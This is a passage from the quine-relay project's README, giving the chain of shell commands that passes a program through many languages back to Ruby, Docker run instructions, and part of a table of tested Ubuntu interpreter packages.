-vcd-none &amp;gt; QR.vim&#xA;$ vim -EsS QR.vim &amp;gt; QR.vb&#xA;$ vbnc QR.vb &amp;amp;&amp;amp; mono ./QR.exe &amp;gt; QR.wasm&#xA;$ $(WASI_RUNTIME) QR.wasm &amp;gt; QR.wat&#xA;$ wat2wasm QR.wat -o QR.wat.wasm &amp;amp;&amp;amp; $(WASI_RUNTIME) QR.wat.wasm &amp;gt; QR.ws&#xA;$ ruby vendor/whitespace.rb QR.ws &amp;gt; QR.xslt&#xA;$ xsltproc QR.xslt &amp;gt; QR.yab&#xA;$ yabasic QR.yab &amp;gt; QR.yorick&#xA;$ yorick -batch QR.yorick &amp;gt; QR.azm&#xA;$ zoem -i QR.azm &amp;gt; QR.zsh&#xA;$ zsh QR.zsh &amp;gt; QR.+&#xA;$ a+ QR.+ &amp;gt; qr.adb&#xA;$ gnatmake qr.adb &amp;amp;&amp;amp; ./qr &amp;gt; QR.als&#xA;$ LANG=C LD_LIBRARY_PATH=/usr/lib/afnix axi QR.als &amp;gt; QR.aheui&#xA;$ ruby vendor/aheui.rb QR.aheui &amp;gt; QR.a68&#xA;$ a68g QR.a68 &amp;gt; QR.ante&#xA;$ ruby vendor/ante.rb QR.ante &amp;gt; QR.aj&#xA;$ ajc QR.aj &amp;amp;&amp;amp; java QR &amp;gt; QR.asy&#xA;$ asy QR.asy &amp;gt; QR.dats&#xA;$ patscc -o QR QR.dats &amp;amp;&amp;amp; ./QR &amp;gt; QR.awk&#xA;$ awk -f QR.awk &amp;gt; QR.bash&#xA;$ bash QR.bash &amp;gt; QR.bc&#xA;$ BC_LINE_LENGTH=4000000 bc -q QR.bc &amp;gt; QR.bsh&#xA;$ bsh QR.bsh &amp;gt; QR.bef&#xA;$ cfunge QR.bef &amp;gt; QR.Blc&#xA;$ ruby vendor/blc.rb &amp;lt; QR.Blc &amp;gt; QR.bf&#xA;$ bf -c500000 QR.bf &amp;gt; QR.c&#xA;$ gcc -o QR QR.c &amp;amp;&amp;amp; ./QR &amp;gt; QR.cpp&#xA;$ g++ -o QR QR.cpp &amp;amp;&amp;amp; ./QR &amp;gt; QR.cs&#xA;$ mcs QR.cs &amp;amp;&amp;amp; mono QR.exe &amp;gt; QR.chef&#xA;$ PERL5LIB=vendor/local/lib/perl5 compilechef QR.chef QR.chef.pl &amp;amp;&amp;amp;&#xA;  perl QR.chef.pl &amp;gt; QR.clj&#xA;$ clojure QR.clj &amp;gt; QR.cmake&#xA;$ cmake -P QR.cmake &amp;gt; QR.cob&#xA;$ cobc -O2 -x QR.cob &amp;amp;&amp;amp; ./QR &amp;gt; QR.coffee&#xA;$ coffee --nodejs --stack_size=100000 QR.coffee &amp;gt; QR.lisp&#xA;$ clisp QR.lisp &amp;gt; QR.d&#xA;$ gdc -o QR QR.d &amp;amp;&amp;amp; ./QR &amp;gt; QR.dfy&#xA;$ dafny QR.dfy &amp;amp;&amp;amp; mono QR.exe &amp;gt; QR.dc&#xA;$ dc QR.dc &amp;gt; QR.dhall || true&#xA;$ dhall text --file QR.dhall &amp;gt; QR.exs&#xA;$ elixir QR.exs &amp;gt; QR.el&#xA;$ emacs -Q --script QR.el &amp;gt; QR.erl&#xA;$ escript QR.erl &amp;gt; QR.fsx&#xA;$ fsharpc QR.fsx -o QR.exe &amp;amp;&amp;amp; mono QR.exe &amp;gt; QR.false&#xA;$ ruby vendor/false.rb QR.false &amp;gt; QR.fl&#xA;$ flex -o QR.fl.c QR.fl &amp;amp;&amp;amp; gcc -o QR QR.fl.c &amp;amp;&amp;amp; ./QR &amp;gt; QR.fish&#xA;$ fish QR.fish &amp;gt; QR.fs&#xA;$ gforth QR.fs &amp;gt; QR.f&#xA;$ gfortran -o QR QR.f &amp;amp;&amp;amp; ./QR &amp;gt; QR.f90&#xA;$ gfortran -o QR QR.f90 &amp;amp;&amp;amp; ./QR &amp;gt; QR.gbs&#xA;$ gbs3 QR.gbs &amp;gt; QR.g&#xA;$ gap -q QR.g &amp;gt; QR.gdb&#xA;$ gdb -q -x QR.gdb &amp;gt; QR.gel&#xA;$ genius QR.gel &amp;gt; QR.gsl&#xA;$ gsl -q QR.gsl &amp;gt; QR.plt&#xA;$ gnuplot QR.plt &amp;gt; QR.go&#xA;$ go run QR.go &amp;gt; QR.gs&#xA;$ ruby vendor/golfscript.rb QR.gs &amp;gt; QR.gpt&#xA;$ mv QR.c QR.c.bak &amp;amp;&amp;amp; gpt -t QR.c QR.gpt &amp;amp;&amp;amp; gcc -o QR QR.c &amp;amp;&amp;amp; ./QR &amp;gt; QR.grass &amp;amp;&amp;amp;&#xA;  mv QR.c.bak QR.c&#xA;$ ruby vendor/grass.rb QR.grass &amp;gt; QR.groovy&#xA;$ groovy QR.groovy &amp;gt; QR.gz&#xA;$ gzip -cd QR.gz &amp;gt; QR.hs&#xA;$ ghc QR.hs &amp;amp;&amp;amp; ./QR &amp;gt; QR.hx&#xA;$ haxe -main QR -neko QR.n &amp;amp;&amp;amp; neko QR.n &amp;gt; QR.icn&#xA;$ icont -s QR.icn &amp;amp;&amp;amp; ./QR &amp;gt; QR.i&#xA;$ ick -bfOc QR.i &amp;amp;&amp;amp; gcc -static QR.c -I /usr/include/ick-* -o QR -lick &amp;amp;&amp;amp;&#xA;  ./QR &amp;gt; QR.j&#xA;$ jasmin QR.j &amp;amp;&amp;amp; java QR &amp;gt; QR.java&#xA;$ javac QR.java &amp;amp;&amp;amp; java QR &amp;gt; QR.js&#xA;$ nodejs QR.js &amp;gt; QR.jq&#xA;$ jq -r -n -f QR.jq &amp;gt; QR.jsfuck&#xA;$ nodejs --stack_size=100000 QR.jsfuck &amp;gt; QR.kt&#xA;$ kotlinc QR.kt -include-runtime -d QR.jar &amp;amp;&amp;amp; kotlin QR.jar &amp;gt; QR.ksh&#xA;$ ksh QR.ksh &amp;gt; QR.lazy&#xA;$ lazyk QR.lazy &amp;gt; qr.li&#xA;$ lisaac qr.li &amp;amp;&amp;amp; ./qr &amp;gt; QR.ls&#xA;$ lsc QR.ls &amp;gt; QR.ll&#xA;$ llvm-as QR.ll &amp;amp;&amp;amp; lli QR.bc &amp;gt; QR.lol&#xA;$ lci QR.lol &amp;gt; QR.lua&#xA;$ lua5.3 QR.lua &amp;gt; QR.m4&#xA;$ m4 QR.m4 &amp;gt; QR.mk&#xA;$ make -f QR.mk &amp;gt; QR.mac&#xA;$ maxima -q --init-mac=QR.mac &amp;gt; QR.mzn&#xA;$ minizinc --solver Gecode --soln-sep &#39;&#39; QR.mzn &amp;gt; QR.il&#xA;$ ilasm QR.il &amp;amp;&amp;amp; mono QR.exe &amp;gt; QR.mustache&#xA;$ mustache QR.mustache QR.mustache &amp;gt; QR.asm&#xA;$ nasm -felf QR.asm &amp;amp;&amp;amp; ld -m elf_i386 -o QR QR.o &amp;amp;&amp;amp; ./QR &amp;gt; QR.neko&#xA;$ nekoc QR.neko &amp;amp;&amp;amp; neko QR.n &amp;gt; QR.5c&#xA;$ nickle QR.5c &amp;gt; QR.m&#xA;$ gcc -o QR QR.m &amp;amp;&amp;amp; ./QR &amp;gt; QR.ml&#xA;$ ocaml QR.ml &amp;gt; QR.octave&#xA;$ mv QR.m QR.m.bak &amp;amp;&amp;amp; octave -qf QR.octave &amp;gt; QR.ook &amp;amp;&amp;amp; mv QR.m.bak QR.m&#xA;$ ruby vendor/ook-to-bf.rb QR.ook QR.ook.bf &amp;amp;&amp;amp; bf -c500000 QR.ook.bf &amp;gt; QR.gp&#xA;$ gp -f -q QR.gp &amp;gt; QR.p&#xA;$ parser3 QR.p &amp;gt; QR.pas&#xA;$ fpc QR.pas &amp;amp;&amp;amp; ./QR &amp;gt; QR.pl&#xA;$ perl QR.pl &amp;gt; QR.pl6&#xA;$ perl6 QR.pl6 &amp;gt; QR.php&#xA;$ php QR.php &amp;gt; QR.png&#xA;$ npiet QR.png &amp;gt; QR.ps&#xA;$ gs -dNODISPLAY -q QR.ps &amp;gt; QR.ppt&#xA;$ ppt -d &amp;lt; QR.ppt &amp;gt; QR.prolog&#xA;$ swipl -q -t qr -f QR.prolog &amp;gt; QR.pr&#xA;$ spin -T QR.pr &amp;gt; QR.py&#xA;$ python3 QR.py &amp;gt; QR.R&#xA;$ R --slave -f QR.R &amp;gt; QR.ratfor&#xA;$ ratfor -o QR.ratfor.f QR.ratfor &amp;amp;&amp;amp; gfortran -o QR QR.ratfor.f &amp;amp;&amp;amp;&#xA;  ./QR &amp;gt; QR.rc&#xA;$ rc QR.rc &amp;gt; QR.rexx&#xA;$ rexx ./QR.rexx &amp;gt; QR2.rb&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You will see that &lt;code&gt;QR.rb&lt;/code&gt; is the same as &lt;code&gt;QR2.rb&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ diff QR.rb QR2.rb&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Alternatively, just type &lt;code&gt;make&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: It may require huge memory to compile some files.&lt;/p&gt; &#xA;&lt;h3&gt;Docker&lt;/h3&gt; &#xA;&lt;p&gt;Simply build the image and run a container as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ docker build -t qr .&#xA;$ docker run --privileged --rm -e CI=true qr&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: you need to run in privileged mode otherwise the &lt;code&gt;maxima&lt;/code&gt; command will fail.&lt;/p&gt; &#xA;&lt;p&gt;If you want to check generated files, you can mount the local directory in the Docker container (but keep using the &lt;code&gt;vendor&lt;/code&gt; directory of the container), as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ docker run --privileged --rm -e CI=true -v $(pwd):/usr/local/share/quine-relay -v /usr/local/share/quine-relay/vendor qr&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Other platforms&lt;/h3&gt; &#xA;&lt;p&gt;You may find &lt;a href=&#34;https://github.com/mame/quine-relay/wiki/Installation&#34;&gt;instructions for other platforms in the wiki&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If you are not using these Linux distributions, please find your way yourself. If you could do it, please let me know. Good luck.&lt;/p&gt; &#xA;&lt;h2&gt;Tested interpreter/compiler versions&lt;/h2&gt; &#xA;&lt;p&gt;I used the following Ubuntu deb packages to test this program.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;#&lt;/th&gt; &#xA;   &lt;th&gt;language&lt;/th&gt; &#xA;   &lt;th&gt;ubuntu package&lt;/th&gt; &#xA;   &lt;th&gt;version&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;1&lt;/td&gt; &#xA;   &lt;td&gt;Ruby&lt;/td&gt; &#xA;   &lt;td&gt;ruby&lt;/td&gt; &#xA;   &lt;td&gt;1:3.0~exp1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2&lt;/td&gt; &#xA;   &lt;td&gt;Rust&lt;/td&gt; &#xA;   &lt;td&gt;rustc&lt;/td&gt; &#xA;   &lt;td&gt;1.58.1+dfsg1~ubuntu1-0ubuntu2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;3&lt;/td&gt; &#xA;   &lt;td&gt;Scala&lt;/td&gt; &#xA;   &lt;td&gt;scala&lt;/td&gt; &#xA;   &lt;td&gt;2.11.12-5&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;4&lt;/td&gt; &#xA;   &lt;td&gt;Scheme&lt;/td&gt; &#xA;   &lt;td&gt;guile-3.0&lt;/td&gt; &#xA;   &lt;td&gt;3.0.7-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;5&lt;/td&gt; &#xA;   &lt;td&gt;Scilab&lt;/td&gt; &#xA;   &lt;td&gt;scilab-cli&lt;/td&gt; &#xA;   &lt;td&gt;6.1.1+dfsg2-3ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;6&lt;/td&gt; &#xA;   &lt;td&gt;sed&lt;/td&gt; &#xA;   &lt;td&gt;sed&lt;/td&gt; &#xA;   &lt;td&gt;4.8-1ubuntu2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;7&lt;/td&gt; &#xA;   &lt;td&gt;Shakespeare&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;8&lt;/td&gt; &#xA;   &lt;td&gt;S-Lang&lt;/td&gt; &#xA;   &lt;td&gt;slsh&lt;/td&gt; &#xA;   &lt;td&gt;2.3.2-5build4&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;9&lt;/td&gt; &#xA;   &lt;td&gt;Smalltalk&lt;/td&gt; &#xA;   &lt;td&gt;gnu-smalltalk&lt;/td&gt; &#xA;   &lt;td&gt;3.2.5-1.3ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;10&lt;/td&gt; &#xA;   &lt;td&gt;Squirrel&lt;/td&gt; &#xA;   &lt;td&gt;squirrel3&lt;/td&gt; &#xA;   &lt;td&gt;3.1-8build1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;11&lt;/td&gt; &#xA;   &lt;td&gt;Standard ML&lt;/td&gt; &#xA;   &lt;td&gt;polyml, libpolyml-dev&lt;/td&gt; &#xA;   &lt;td&gt;5.7.1-4ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;12&lt;/td&gt; &#xA;   &lt;td&gt;Subleq&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;13&lt;/td&gt; &#xA;   &lt;td&gt;SurgeScript&lt;/td&gt; &#xA;   &lt;td&gt;surgescript&lt;/td&gt; &#xA;   &lt;td&gt;0.5.4.4-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;14&lt;/td&gt; &#xA;   &lt;td&gt;Tcl&lt;/td&gt; &#xA;   &lt;td&gt;tcl&lt;/td&gt; &#xA;   &lt;td&gt;8.6.11+1build2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;15&lt;/td&gt; &#xA;   &lt;td&gt;tcsh&lt;/td&gt; &#xA;   &lt;td&gt;tcsh&lt;/td&gt; &#xA;   &lt;td&gt;6.21.00-1.1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;16&lt;/td&gt; &#xA;   &lt;td&gt;Thue&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;17&lt;/td&gt; &#xA;   &lt;td&gt;TypeScript&lt;/td&gt; &#xA;   &lt;td&gt;node-typescript&lt;/td&gt; &#xA;   &lt;td&gt;4.5.4+ds1-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;18&lt;/td&gt; &#xA;   &lt;td&gt;Unlambda&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;19&lt;/td&gt; &#xA;   &lt;td&gt;Vala&lt;/td&gt; &#xA;   &lt;td&gt;valac&lt;/td&gt; &#xA;   &lt;td&gt;0.56.0-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;20&lt;/td&gt; &#xA;   &lt;td&gt;Velato&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;21&lt;/td&gt; &#xA;   &lt;td&gt;Verilog&lt;/td&gt; &#xA;   &lt;td&gt;iverilog&lt;/td&gt; &#xA;   &lt;td&gt;11.0-1.1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;22&lt;/td&gt; &#xA;   &lt;td&gt;Vimscript&lt;/td&gt; &#xA;   &lt;td&gt;vim&lt;/td&gt; &#xA;   &lt;td&gt;2:8.2.3995-1ubuntu2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;23&lt;/td&gt; &#xA;   &lt;td&gt;Visual Basic&lt;/td&gt; &#xA;   &lt;td&gt;mono-vbnc&lt;/td&gt; &#xA;   &lt;td&gt;4.0.1-3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;24&lt;/td&gt; &#xA;   &lt;td&gt;WebAssembly (Binary format)&lt;/td&gt; &#xA;   &lt;td&gt;wabt&lt;/td&gt; &#xA;   &lt;td&gt;1.0.27-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;25&lt;/td&gt; &#xA;   &lt;td&gt;WebAssembly (Text format)&lt;/td&gt; &#xA;   &lt;td&gt;wabt&lt;/td&gt; &#xA;   &lt;td&gt;1.0.27-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;26&lt;/td&gt; &#xA;   &lt;td&gt;Whitespace&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;27&lt;/td&gt; &#xA;   &lt;td&gt;XSLT&lt;/td&gt; &#xA;   &lt;td&gt;xsltproc&lt;/td&gt; &#xA;   &lt;td&gt;1.1.34-4build2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;28&lt;/td&gt; &#xA;   &lt;td&gt;Yabasic&lt;/td&gt; &#xA;   &lt;td&gt;yabasic&lt;/td&gt; &#xA;   &lt;td&gt;1:2.90.2-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;29&lt;/td&gt; &#xA;   &lt;td&gt;Yorick&lt;/td&gt; &#xA;   &lt;td&gt;yorick&lt;/td&gt; &#xA;   &lt;td&gt;2.2.04+dfsg1-12&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;30&lt;/td&gt; &#xA;   &lt;td&gt;Zoem&lt;/td&gt; &#xA;   &lt;td&gt;zoem&lt;/td&gt; &#xA;   &lt;td&gt;11-166-2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;31&lt;/td&gt; &#xA;   &lt;td&gt;zsh&lt;/td&gt; &#xA;   &lt;td&gt;zsh&lt;/td&gt; &#xA;   &lt;td&gt;5.8.1-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;32&lt;/td&gt; &#xA;   &lt;td&gt;A+&lt;/td&gt; &#xA;   &lt;td&gt;aplus-fsf&lt;/td&gt; &#xA;   &lt;td&gt;4.22.1-10.1ubuntu2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;33&lt;/td&gt; &#xA;   &lt;td&gt;Ada&lt;/td&gt; &#xA;   &lt;td&gt;gnat&lt;/td&gt; &#xA;   &lt;td&gt;10.1ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;34&lt;/td&gt; &#xA;   &lt;td&gt;AFNIX&lt;/td&gt; &#xA;   &lt;td&gt;afnix&lt;/td&gt; &#xA;   &lt;td&gt;3.5.0-3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;35&lt;/td&gt; &#xA;   &lt;td&gt;Aheui&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;36&lt;/td&gt; &#xA;   &lt;td&gt;ALGOL 68&lt;/td&gt; &#xA;   &lt;td&gt;algol68g&lt;/td&gt; &#xA;   &lt;td&gt;2.8.4-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;37&lt;/td&gt; &#xA;   &lt;td&gt;Ante&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;38&lt;/td&gt; &#xA;   &lt;td&gt;AspectJ&lt;/td&gt; &#xA;   &lt;td&gt;aspectj&lt;/td&gt; &#xA;   &lt;td&gt;1.9.2-2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;39&lt;/td&gt; &#xA;   &lt;td&gt;Asymptote&lt;/td&gt; &#xA;   &lt;td&gt;asymptote&lt;/td&gt; &#xA;   &lt;td&gt;2.78+ds-2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;40&lt;/td&gt; &#xA;   &lt;td&gt;ATS&lt;/td&gt; &#xA;   &lt;td&gt;ats2-lang&lt;/td&gt; &#xA;   &lt;td&gt;0.4.2-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;41&lt;/td&gt; &#xA;   &lt;td&gt;Awk&lt;/td&gt; &#xA;   &lt;td&gt;gawk&lt;/td&gt; &#xA;   &lt;td&gt;1:5.1.0-1build3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;42&lt;/td&gt; &#xA;   &lt;td&gt;bash&lt;/td&gt; &#xA;   &lt;td&gt;bash&lt;/td&gt; &#xA;   &lt;td&gt;5.1-6ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;43&lt;/td&gt; &#xA;   &lt;td&gt;bc&lt;/td&gt; &#xA;   &lt;td&gt;bc&lt;/td&gt; &#xA;   &lt;td&gt;1.07.1-3build1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;44&lt;/td&gt; &#xA;   &lt;td&gt;BeanShell&lt;/td&gt; &#xA;   &lt;td&gt;bsh&lt;/td&gt; &#xA;   &lt;td&gt;2.0b4-20&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;45&lt;/td&gt; &#xA;   &lt;td&gt;Befunge&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;46&lt;/td&gt; &#xA;   &lt;td&gt;BLC8&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;47&lt;/td&gt; &#xA;   &lt;td&gt;Brainfuck&lt;/td&gt; &#xA;   &lt;td&gt;bf&lt;/td&gt; &#xA;   &lt;td&gt;20041219ubuntu7&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;48&lt;/td&gt; &#xA;   &lt;td&gt;C&lt;/td&gt; &#xA;   &lt;td&gt;gcc&lt;/td&gt; &#xA;   &lt;td&gt;4:11.2.0-1ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;49&lt;/td&gt; &#xA;   &lt;td&gt;C++&lt;/td&gt; &#xA;   &lt;td&gt;g++&lt;/td&gt; &#xA;   &lt;td&gt;4:11.2.0-1ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;50&lt;/td&gt; &#xA;   &lt;td&gt;C#&lt;/td&gt; &#xA;   &lt;td&gt;mono-mcs&lt;/td&gt; &#xA;   &lt;td&gt;6.8.0.105+dfsg-3.2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;51&lt;/td&gt; &#xA;   &lt;td&gt;Chef&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;52&lt;/td&gt; &#xA;   &lt;td&gt;Clojure&lt;/td&gt; &#xA;   &lt;td&gt;clojure&lt;/td&gt; &#xA;   &lt;td&gt;1.10.2-1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;53&lt;/td&gt; &#xA;   &lt;td&gt;CMake&lt;/td&gt; &#xA;   &lt;td&gt;cmake&lt;/td&gt; &#xA;   &lt;td&gt;3.22.1-1ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;54&lt;/td&gt; &#xA;   &lt;td&gt;Cobol&lt;/td&gt; &#xA;   &lt;td&gt;gnucobol4&lt;/td&gt; &#xA;   &lt;td&gt;4.0&lt;del&gt;early&lt;/del&gt;20200606-6&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;55&lt;/td&gt; &#xA;   &lt;td&gt;CoffeeScript&lt;/td&gt; &#xA;   &lt;td&gt;coffeescript&lt;/td&gt; &#xA;   &lt;td&gt;1.12.8~dfsg-5&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;56&lt;/td&gt; &#xA;   &lt;td&gt;Common Lisp&lt;/td&gt; &#xA;   &lt;td&gt;clisp&lt;/td&gt; &#xA;   &lt;td&gt;1:2.49.20210628.gitde01f0f-2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;57&lt;/td&gt; &#xA;   &lt;td&gt;D&lt;/td&gt; &#xA;   &lt;td&gt;gdc&lt;/td&gt; &#xA;   &lt;td&gt;4:11.2.0-1ubuntu1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;58&lt;/td&gt; &#xA;   &lt;td&gt;Dafny&lt;/td&gt; &#xA;   &lt;td&gt;dafny&lt;/td&gt; &#xA;   &lt;td&gt;2.3.0+dfsg-0.1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;59&lt;/td&gt; &#xA;   &lt;td&gt;dc&lt;/td&gt; &#xA;   &lt;td&gt;dc&lt;/td&gt; &#xA;   &lt;td&gt;1.07.1-3build1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;60&lt;/td&gt; &#xA;   &lt;td&gt;Dhall&lt;/td&gt; &#xA;   &lt;td&gt;dhall&lt;/td&gt; &#xA;   &lt;td&gt;1.32.0-1build1.1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;61&lt;/td&gt; &#xA;   &lt;td&gt;Elixir&lt;/td&gt; &#xA;   &lt;td&gt;elixir&lt;/td&gt; &#xA;   &lt;td&gt;1.12.2.dfsg-2.2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   